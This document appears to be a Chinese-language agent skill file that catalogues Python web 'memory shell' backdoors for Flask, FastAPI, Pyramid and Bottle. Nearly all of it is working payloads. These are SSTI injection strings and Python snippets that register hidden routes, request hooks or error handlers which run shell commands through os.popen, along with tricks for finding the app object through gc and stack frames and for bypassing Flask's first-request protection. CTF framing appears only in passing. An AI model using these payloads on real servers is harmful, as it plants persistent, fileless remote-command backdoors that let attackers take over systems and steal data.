---
name: memory-shell-python
description: Use when encountering Python Web内存马技术 - Flask/Fastapi/Pyramid/Bottle无文件后门
---

# Python Web 内存马

## Info

- **Domain**: web
- **Tags**: web, memory-shell, python, flask, fastapi, persistence

## 概述

内存马是一种恶意后门程序，不以文件落地，直接注入到正在运行的程序内存中执行。在 Python Web 场景中，一般通过 hook 生命周期函数或添加恶意路由实现。

**适用场景**: SSTI 无回显时打入内存马维持访问

---

## 1. Flask 内存马

### after_request 方式

```python
# 每次请求后执行，通过 URL 参数执行命令
app.after_request_funcs.setdefault(None, []).append(
    lambda resp: CmdResp if request.args.get('cmd') and exec('global CmdResp;CmdResp=make_response(os.popen(request.args.get(\'cmd\')).read())')==None else resp
)
```

通过 SSTI 注入:
```jinja2
{{"".__class__.__base__.__subclasses__()[INDEX].__init__.__globals__['eval']("__import__('sys').modules['__main__'].__dict__['app'].after_request_funcs...")}}
```

### before_request 方式

```python
# 每次请求前执行
{{"".__class__.__base__.__subclasses__()[INDEX].__init__.__globals__['eval']("__import__('sys').modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None,[]).append(lambda :__import__('os').popen('whoami').read())")}}
```

### errorhandler 方式

```python
# 访问不存在的路由时触发
{{"".__class__.__base__.__subclasses__()[INDEX].__init__.__globals__['exec']("global exc_class;global code;global app;app=__import__('sys').modules['__main__'].__dict__['app'];exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen('ls').read()")}}
```

### 创建路由方式（推荐）

```jinja2
{{lipsum.__globals__.__builtins__.eval('[ __import__(\'time\').sleep(3) for flask in [__import__("flask")] for app in __import__("gc").get_objects() if type(app) == flask.Flask for jinja_globals in [app.jinja_env.globals] for z3 in [ lambda : __import__(\'os\').popen(jinja_globals["request"].args.get("cmd", "id")).read() ] if [ app.__dict__.update({\'_got_first_request\':False}), app.add_url_rule("/z3", endpoint="z3", view_func=z3) ] ]')}}
```

**原理**: 通过 gc.get_objects() 查找 Flask 应用实例，动态注册新路由 `/z3`，访问 `/z3?cmd=id` 即可执行命令。

---

## 2. FastAPI 内存马

### 添加路由的函数

```python
add_api_route()
api_route()
add_api_websocket_route()
add_middleware()
add_route()
```

### 打入内存马

```python
# 通过 SSTI 注入
/calc?calc_req=config.__init__.__globals__['__builtins__']['exec']('app.add_api_route("/flag",lambda:__import__("os").popen("cat /flag").read());',{"app":app})
```

**访问**: `GET /flag` → 返回 flag 内容

---

## 3. Pyramid 内存马

### 方法1: add_response_callback

```jinja2
/shell?shellcmd={{lipsum|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('exec')("getattr(request,'add_response_callback')(lambda+request,response:setattr(response,'text',getattr(getattr(__import__('os'),'popen')('/readflag'),'read')()))",{'request':request})}}
```

### 方法2: 动态注册路由

```python
exec("import sys;config = sys.modules['__main__'].config;app=sys.modules['__main__'].app;config.add_route('shell', '/shell');config.add_view(lambda request: Response(__import__('os').popen(request.params.get('1')).read()),route_name='shell');app = config.make_wsgi_app()")
```

### 方法3: 栈帧回溯获取 config（强网杯 Pyramid 决赛题）

**场景**: `exec(code)` 在受限函数作用域内执行，`config` 变量存在于外层闭包中，无法直接访问。

**栈帧回溯技巧**:

```python
def waff():
    def f():
        yield g.gi_frame.f_back

    g = f()
    frame = next(g)
    
    # 回溯调用栈找到 Pyramid 框架层
    target_frame = frame.f_back.f_back.f_back
    b = target_frame.f_globals  # 包含 config 对象
    
    config = b['config']
    Response = b['Response']
    
    # 注册内存马
    def webshell(request):
        cmd = request.params.get('cmd', '')
        import os
        result = os.popen(cmd).read()
        return Response(result)
    
    config.add_route('mem_shell', '/backdoor')
    config.add_view(webshell, route_name='mem_shell')
    config.commit()

waff()
```

**调用栈回溯路径**:
```
栈层级 | 函数              | 包含变量
-------|-------------------|------------------
0      | Pyramid框架代码    | config, Response
1      | system_test()     | request, code
2      | waff()            | (空)
3      | f()               | g
4      | 生成器代码         | (内部)
```

需要 `f_back` 3 次: `f() → waff() → system_test() → Pyramid框架`

---

## 4. Bottle 内存马

### 通过 hook 注入

```python
/memshell?cmd=app.add_hook('after_request', lambda: __import__('bottle').abort(404,__import__('os').popen(request.query.get('a')).read()))
```

### 直接路由注册

```python
# Bottle 应用结构
from bottle import template, Bottle, request, error

app = Bottle()

@error(404)
@app.route('/memshell')
def index():
    result = eval(request.params.get('cmd'))
    return template('Hello {{result}}, how are you?', result)
```

---

## 5. 打入内存马的通用思路

```
1. 找到应用实例 (通过 sys.modules 或 gc.get_objects())
2. 绕过首次请求保护 (Flask: _got_first_request=False)
3. 注册新的路由/hook/callback
4. 通过新路由执行系统命令
```

### 查找 Flask app 的通用方法

```python
import gc
import flask

for obj in gc.get_objects():
    if type(obj) == flask.Flask:
        app = obj
        break
```

### 在 SSTI 中执行

```jinja2
# 通过 gc.get_objects() 找到 Flask app
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if 'warning' in x.__name__ %}
    {% for app in x()._module.__builtins__['__import__']('gc').get_objects() %}
      {% if app.__class__.__name__ == 'Flask' %}
        {{ app.add_url_rule(...) }}
      {% endif %}
    {% endfor %}
  {% endif %}
{% endfor %}
```
